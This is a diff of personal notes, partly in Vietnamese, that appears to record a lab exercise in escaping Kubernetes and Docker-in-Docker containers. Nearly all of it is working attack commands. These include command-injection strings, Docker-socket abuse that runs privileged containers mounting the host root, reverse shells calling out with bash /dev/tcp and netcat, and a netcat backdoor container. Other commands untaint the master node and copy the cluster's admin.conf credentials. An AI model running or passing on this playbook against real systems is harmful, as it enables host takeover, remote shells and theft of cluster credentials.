@@ -32,7 +32,7 @@ kubectl get pods -n kube-system
 
 kubectl get nodes
 
-#exploit DIND
+
  ;/tmp/crictl -r unix:///custom/containerd/containerd.sock pull biladen/php-hack
 
 https://www.letscloud.io/community/how-to-install-kubernetesk8s-and-docker-on-ubuntu-2004
@@ -41,6 +41,17 @@ https://nvtienanh.info/blog/cai-dat-kubernetes-cluster-tren-ubuntu-server-22-04
 
 https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-2/docker-in-docker-exploitation-in-kubernetes-containers/welcome/
 
+chmod 666 /var/run/docker.sock
+
+ls -l /custom/docker/docker.sock
+DOCKER_HOST=unix:///custom/docker/docker.sock docker version
+
+#kube exec
+
+kubectl exec -it health-check-deployment-77466cffcd-2zjsq     -- /bin/bash
+kubectl delete pod health-check-deployment-6684977b6-ttc7m
+
+# lệnh DIND
 127.0.0.1; id
 
 ; mount
@@ -57,17 +68,7 @@ docker -H unix:///run/cri-dockerd.sock run -it --rm --privileged --net=host --pi
 ;tmp/docker/docker -H unix:///custom/docker/docker.sock build -t php-hack /data/
 ;tmp/docker/docker -H unix:///custom/docker/docker.sock run -dp 8089:80 php-hack
 
-chmod 666 /var/run/docker.sock
 
-ls -l /custom/docker/docker.sock
-DOCKER_HOST=unix:///custom/docker/docker.sock docker version
-
-#kube exec
-
-kubectl exec -it health-check-deployment-77466cffcd-2zjsq     -- /bin/bash
-kubectl delete pod health-check-deployment-6684977b6-ttc7m
-
-# lệnh docker
 docker -H unix:///run/docker.sock  images
 
 docker -H unix:///run/docker.sock run -p 8085:80  ph4n10m1808/hacked_images_docker
@@ -76,33 +77,47 @@ hostname -I
 
 docker exec -it a221d98fdd21 curl http://localhost:80
 
-kubectl exec -it health-check-deployment-6684977b6-ttc7m     -- bash
-
 docker -H unix:///run/docker.sock run -p 8085:80 ph4n10m1808/hacked_images_docker
 
-#rce
+#revershell
 bash -c 'bash -i >& /dev/tcp/192.168.1.3/1337 0>&1'
 
-#docker break
-/tmp/docker/docker run -i --rm -v /:/mnt alpine chroot /mnt sh
 
 
-#khai thác DIND 
-curl --unix-socket /run/docker.sock http://localhost/containers/json # kiểm tra quyền
+#khai thác RCE
+curl --unix-socket /run/docker.sock http://localhost/containers/json 	# kiểm tra quyền
 
-;/tmp/docker/docker -H unix:///run/docker.sock run -i --privileged --network=host  -v /:/host alpine chroot /host /bin/sh # lấy quyền root 
-;/tmp/docker/docker -H unix:///run/docker.sock run -d --privileged   -v /:/host alpine sh -c "nc -lp 4444 -e /bin/sh"  #container backdor
-;/tmp/docker/docker run -d --rm --privileged --network host alpine /bin/sh -c "nc -e /bin/sh 192.168.1.3 1337"
-
-
-#Run the image mounting the host disk and chroot on it
-;/tmp/docker/docker run -i -v /:/host/ ubuntu:18.04 chroot /host/ bash
-;/tmp/docker/docker run --rm -i --privileged ubuntu bash
+;/tmp/docker/docker -H unix:///run/docker.sock run -i --privileged --network=host  -v /:/host alpine chroot /host /bin/sh 	# lấy quyền root 
+;/tmp/docker/docker run --rm --network=host alpine sh -c "nc 192.168.1.24 4444 -e /bin/sh"  #RCE qua docker 
 
 
-nc 192.168.127.207 4444
+#RCE hiệu quả
+;/tmp/docker/docker -H unix:///var/run/docker.sock run -i --rm --privileged   -v /:/host --network=host alpine sh -c  "mkfifo /tmp/p; cat /tmp/p | sh 2>&1 | nc 192.168.1.24 4444 > /tmp/p" 
+
+;/tmp/docker/docker -H unix:///var/run/docker.sock run -i --rm --privileged -v /:/host --network=host ubuntu sh -c "apt update && apt install -y netcat-openbsd && rm -f /tmp/p && mkfifo /tmp/p && cat /tmp/p | /bin/bash -i 2>&1 | nc 192.168.1.24 4444 > /tmp/p"
+
+hostname -I 	# hiển thị IP của container
+nc 192.168.127.208 4444 -e /bin/sh 	#RCE
+ncat.exe -lvp 4444 	#listen
+apk add --no-cache netcat-openbsd # cai nc cho docker
+
+/tmp/docker/docker ps -q | xargs -I {} /tmp/docker/docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' {} # kiểm tra IP docker trong pods của k8s
+# xóa docker 
+docker -H unix:///var/run/docker.sock ps -a --format "{{.ID}} {{.Image}}" | grep -E 'alpine|ubuntu' | awk '{print $1}' | xargs docker -H unix:///var/run/docker.sock rm -f
+
+
 #escape to host
+
+chroot /host sh		# từ RCE breakout ra máy worker
 capsh --print
 ls /host-system/
 chroot /host-system bash
 
+kubectl describe node k8s-master.ndbien.local | grep Taint 				#kiểm tra taints  (làm pod k chạy trên master duoc)
+kubectl taint nodes k8s-master.ndbien.local node-role.kubernetes.io/master:NoSchedule- 	# hủy taints
+ls -lah /host/etc/kubernetes
+kubectl cp kube-system/root-daemonset-h48sn:/tmp/admin.conf /home/vagrant/admin.conf
+kubectl exec -it -n kube-system rce-daemon-mdg5j -- chroot /host /bin/bash 		#RCE vào master thông qua pod
+
+python3 -c 'import pty; pty.spawn("/bin/bash")' 					# upgrade shell
+script /dev/null -c bash
